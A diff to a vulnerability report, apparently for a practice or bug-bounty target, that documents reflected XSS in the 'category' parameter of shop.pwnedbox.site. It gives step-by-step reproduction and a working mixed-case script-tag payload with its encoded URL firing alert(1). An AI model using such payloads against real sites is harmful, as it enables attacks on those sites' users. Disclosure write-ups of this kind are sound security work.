@@ -2,34 +2,51 @@
 Reflected XSS - shop.pwnedbox.site
 
 ## Description
-The `category` GET parameter on `shop.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using a mixed-case script tag successfully triggered an `alert(1)` dialog in the browser.
+The `category` GET parameter on `shop.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). The parameter was identified by clicking the Physics category, and a crafted JavaScript payload successfully triggered an `alert(1)` dialog in the browser.
 
 ## Steps to Reproduce
 
-1. Open the target URL:
+1. Open the target website:
    ```text
-   https://shop.pwnedbox.site/index.php
+   https://shop.pwnedbox.site/
    ```
 
-2. Open the following crafted URL in a browser:
+2. Navigate to the product categories and click on **Physics**.
+
+3. Observe that the URL changes to the following format:
+   ```text
+   https://shop.pwnedbox.site/index.php?category=physics
+   ```
+
+4. Replace the existing `category` value with the following crafted XSS payload:
+   ```html
+   hakama'"><><sCrIpT>alert(1)</sCrIpT>
+   ```
+
+5. Open the modified URL in a browser:
    ```text
    https://shop.pwnedbox.site/index.php?category=hakama%27%22%3C%3E%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E
    ```
 
-3. Allow the page to load.
+6. Allow the page to load and observe the JavaScript alert dialog displaying `1`.
 
-4. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.
-
-5. Dismiss the alert dialog.
+7. Dismiss the alert dialog.
 
 ## POC (Proof of Concept)
 
 **Target URL:**  
-https://shop.pwnedbox.site/index.php
+https://shop.pwnedbox.site/
 
 **HTTP Method:** GET
 
 **Vulnerable Parameter:** `category`
+
+**Parameter Discovery:** Clicked on the Physics category, which generated the `category` parameter in the URL.
+
+**Original URL:**
+```text
+https://shop.pwnedbox.site/index.php?category=physics
+```
 
 **Payload:**
 ```html
